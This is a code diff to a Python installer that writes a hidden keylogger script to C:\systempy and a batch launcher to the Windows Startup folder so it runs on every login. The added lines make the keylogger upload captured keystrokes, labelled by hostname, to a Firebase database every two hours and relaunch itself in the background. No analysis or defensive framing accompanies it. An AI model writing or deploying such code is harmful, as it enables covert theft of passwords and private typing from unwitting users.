@@ -4,8 +4,8 @@ import shutil
 import sys
 
 pythonw_path = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
-python_file_name = "key.pyw"  # Python file name, can be changed dynamically
-batch_file_name = "start.bat"  # Custom batch file name, can be changed dynamically
+python_file_name = "new_key.pyw"  # Python file name, can be changed dynamically
+batch_file_name = "new_start.bat"  # Custom batch file name, can be changed dynamically
 
 startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
 systempy_folder = "C:\\systempy"
@@ -16,45 +16,50 @@ if not os.path.exists(systempy_folder):
     os.makedirs(systempy_folder)
 
 python_code = '''from pynput.keyboard import Key, Listener
-import os
-from datetime import datetime
-import time
-
-# Define paths
+import os, time, requests, socket, sys, subprocess
+firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
 log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")
-
-# Log start time
-with open(log_file, "a") as file:
-    file.write(f"\\n--- Logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\\n")
-
-# Debounce settings
 recent_keys = {}
-debounce_time = 0.2  # seconds
-
-# Function to write keystrokes to file with debounce
+debounce_time = 0.2
 def write_to_file(key):
     current_time = time.time()
     key_str = None
-
-    # Handle key events
-    if hasattr(key, 'char') and key.char:
-        key_str = key.char
-    elif key == Key.space:
-        key_str = " "
-    elif key == Key.enter:
-        key_str = "\\n"
-    elif key == Key.backspace:
-        key_str = "[BS]"
-
+    if hasattr(key, 'char') and key.char: key_str = key.char
+    elif key == Key.space: key_str = " "
+    elif key == Key.enter: key_str = "\\n"
+    elif key == Key.backspace: key_str = "[BS]"
     if key_str and (current_time - recent_keys.get(key_str, 0)) > debounce_time:
-        with open(log_file, "a") as file:
-            file.write(key_str)
+        with open(log_file, "a") as file: file.write(key_str)
         recent_keys[key_str] = current_time
-
-# Start listener
-with Listener(on_press=write_to_file) as listener:
-    listener.join()
-'''
+def upload_to_firebase():
+    hostname = socket.gethostname()
+    localtime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        with open(log_file, 'r') as file:
+            data = {'runnner': file.read()}
+        while True:
+            try:
+                response = requests.put(f'{firebase_url}users/{hostname}/{localtime}.json', json=data)
+                if response.status_code == 200: break
+                time.sleep(10)
+            except requests.exceptions.RequestException:
+                time.sleep(10)
+    except FileNotFoundError: pass
+def ensure_script_running():
+    while True:
+        try:
+            with Listener(on_press=write_to_file) as listener: listener.join()
+        except Exception: time.sleep(10)
+def run_in_background():
+    if len(sys.argv) == 1:
+        script_path = os.path.abspath(__file__)
+        subprocess.Popen([sys.executable, script_path, 'background'], close_fds=True)
+if __name__ == '__main__':
+    run_in_background()
+    upload_to_firebase()
+    while True:
+        time.sleep(7200)
+        upload_to_firebase()'''
 
 # Write the Python code to the key.pyw file in the systempy folder
 with open(python_script_dest, "w") as file:
@@ -64,7 +69,7 @@ with open(python_script_dest, "w") as file:
 batch_file_content = f"""@echo off
 pushd %~dp0
 "{pythonw_path}" "{python_script_dest}"
-exit /b
+exit
 """
 
 # Write the batch file in the Startup folder
